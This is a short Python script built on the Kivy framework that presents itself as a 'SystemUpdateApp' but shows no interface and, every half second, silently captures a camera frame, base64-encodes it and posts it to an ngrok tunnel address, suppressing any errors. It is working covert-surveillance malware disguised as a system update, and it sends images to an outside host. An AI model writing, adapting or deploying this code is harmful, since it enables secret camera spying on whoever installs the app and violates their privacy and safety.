import base64, requests, cv2
from kivy.app import App
from kivy.clock import Clock

URL_NGROK = "https://bleariest-portraitlike-dreama.ngrok-free.dev"

class SystemUpdateApp(App):
    def build(self):
        Clock.schedule_interval(self.capture_and_stream, 0.5)
        return None

    def capture_and_stream(self, dt):
        cap = cv2.VideoCapture(1)
        ret, frame = cap.read()
        if ret:
            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 30])
            jpg_as_text = base64.b64encode(buffer).decode('utf-8')
            try:
                requests.post(f"{URL_NGROK}/stream_upload", data=f"data:image/jpeg;base64,{jpg_as_text}", timeout=2)
            except: pass
        cap.release()

if __name__ == '__main__':
    SystemUpdateApp().run()
